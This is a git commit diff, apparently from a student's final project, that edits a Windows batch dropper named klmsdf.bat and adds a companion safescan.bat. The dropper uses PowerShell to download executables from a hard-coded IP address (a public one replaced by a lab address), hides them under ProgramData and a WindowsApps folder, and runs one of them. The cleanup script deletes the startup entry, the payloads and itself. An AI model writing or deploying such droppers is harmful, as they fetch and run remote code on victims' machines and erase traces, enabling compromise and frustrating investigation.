9ace69f0292f004dace9be787704bf4b06a6f96b
maxCapote <maximillian.capote@mymail.champlain.edu>
2019-04-12 23:54:57 -0400

    Adjustment

--- Master Final/klmsdf.bat
+++ Master Final/klmsdf.bat
@@ -1,4 +1,4 @@
-@echo off
+@ECHO OFF
 
 IF NOT EXIST C:\ProgramData\ra7.exe (
    GOTO REDOWN1
@@ -8,10 +8,17 @@ IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe' (
    GOTO REDOWN2
 )
 
+IF NOT EXIST '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.bat' (
+   GOTO REDOWN3
+)
+
 :REDOWN1
-   powershell -Command "Invoke-WebRequest http://184.171.144.131/ra7.exe -OutFile C:\ProgramData\ra7.exe"
+   powershell -Command "Invoke-WebRequest http://192.168.56.101/ra7.exe -OutFile C:\ProgramData\ra7.exe"
 
 :REDOWN2
-   powershell -Command "Invoke-WebRequest http://184.171.144.131/8uND13.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe'"
+   powershell -Command "Invoke-WebRequest http://192.168.56.101/8uND13.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe'"
+
+:REDOWN3
+   powershell -Command "Invoke-WebRequest http://192.168.56.101/safescan.exe -OutFile '%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\safescan.exe'"
 
 powershell -Command "& C:\ProgramData\ra7.exe"
---
+++ Master Final/safescan.bat
@@ -0,0 +1,5 @@
+@ECHO OFF
+DEL "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\klmsdf.bat"
+DEL "C:\ProgramData\ra7.exe"
+DEL "%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\8uND13.exe"
+DEL "%~f0"
